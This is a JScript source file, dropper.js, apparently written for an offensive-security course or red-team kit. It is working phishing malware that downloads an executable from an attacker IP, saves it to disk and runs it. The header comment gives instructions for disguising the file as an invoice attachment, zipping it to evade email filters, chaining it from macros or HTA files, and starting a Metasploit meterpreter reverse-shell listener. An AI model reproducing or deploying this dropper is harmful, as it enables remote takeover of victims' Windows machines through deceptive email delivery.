/*
================================================================
dropper.js — JScript Phishing Dropper: HTTP Download + Execute via XMLHTTP / ADODB.Stream
================================================================
WHAT THIS DOES:
  A Windows Script Host (WSH) JScript file that:
    1. Makes an HTTP GET request to the URL at line 1 using MSXML2.XMLHTTP
       (a built-in Windows COM object for HTTP requests)
    2. If the server responds with HTTP 200 OK, saves the binary response
       to disk as "bypassrunner.exe" using ADODB.Stream
       (a COM object that handles binary data streams)
    3. Runs the saved .exe via WScript.Shell.Run()

  This is a classic phishing dropper — attach to email, victim double-
  clicks it, and it silently downloads and runs your payload.

BEFORE USE — CHANGE THE URL (line immediately after this comment block):
  var url = "http://<YOUR_KALI_IP>/bypassrunner.exe"

  Replace 172.21.23.10 with your actual Kali IP.
  Replace bypassrunner.exe with your actual payload filename.
  The payload you're serving must be a Windows executable (.exe).

PREPARE YOUR PAYLOAD (on Kali):
  1. Build your payload (e.g. compile clrunner.exe or any other loader)
  2. Copy it to your web server:
       cp clrunner.exe /var/www/html/bypassrunner.exe
  3. Start your web server:
       python3 -m http.server 80
       (or: service apache2 start)

HOW TO DELIVER (phishing):
  Option A — Email attachment:
    Attach dropper.js directly to a phishing email.
    Rename it to something convincing (e.g. "Invoice_March.js" or hide
    inside a .zip if email filters block .js).
    When victim double-clicks -> wscript.exe runs it silently.

  Option B — Hosted link:
    Host dropper.js on your server, send victim a link.
    Browser may warn about downloading .js files.

  Option C — Macro/HTA chain:
    Use this JS file as the second stage dropped by a macro or HTA.

HOW TO RUN MANUALLY (for testing):
  Silent (no output window):
    wscript dropper.js

  With console output (shows errors):
    cscript dropper.js

  Force via cmd:
    cmd /c wscript dropper.js

  Force via PowerShell:
    Start-Process wscript.exe -ArgumentList "dropper.js"

NOTE ON WHERE THE FILE IS SAVED:
  The .exe is saved as "bypassrunner.exe" in the CURRENT WORKING DIRECTORY
  when wscript.exe is launched. If double-clicked from Desktop, that's the
  Desktop. Change the path in SaveToFile() if needed (e.g. "C:\\Temp\\run.exe").

START YOUR LISTENER FIRST (on Kali):
  msfconsole -q -x "use exploit/multi/handler; \
    set payload windows/x64/meterpreter/reverse_tcp; \
    set LHOST <YOUR_IP>; set LPORT 443; exploit -j"

BEFORE USE, CHANGE:
  - var url (line 1 below) -> your Kali IP and payload filename
================================================================
*/
var url = "http://172.21.23.10/bypassrunner.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("bypassrunner.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("bypassrunner.exe");